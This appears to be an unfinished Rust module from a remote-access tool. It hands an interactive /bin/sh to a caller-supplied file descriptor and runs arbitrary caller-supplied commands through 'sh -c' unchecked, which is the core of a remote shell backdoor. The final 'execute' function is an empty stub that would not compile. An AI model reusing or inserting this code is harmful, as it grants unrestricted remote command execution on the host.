use std::env::args;
use std::ffi::CString;
use std::process::Command;

use nix::unistd::{dup2, execv};

use crate::util::{c_str, init_io};

pub fn shell(fd: i32, _params: &[&str]) -> String {
    init_io(fd);
    execv(&c_str("/bin/sh"),
          &[&c_str(&args().collect::<Vec<String>>()[0]), &c_str("-i")]);
    "".to_string()
}

pub fn cmd(fd: i32, params: &[&str]) -> String {
    init_io(fd);
    // buggy, skip
    //let result = Command::new("/bin/sh").arg("-c").arg(params.join(" ")).output().unwrap();
    let result = Command::new("/bin/sh").arg("-c").arg(params.join(" ")).spawn().unwrap();
    //format!("stdout: {}\nstderr: {}\n", String::from_utf8_lossy(result.stdout.as_slice()), String::from_utf8_lossy(result.stderr.as_slice()))
    "done".to_string()
}

pub fn execute(fd: i32, params: &[&str]) -> String {}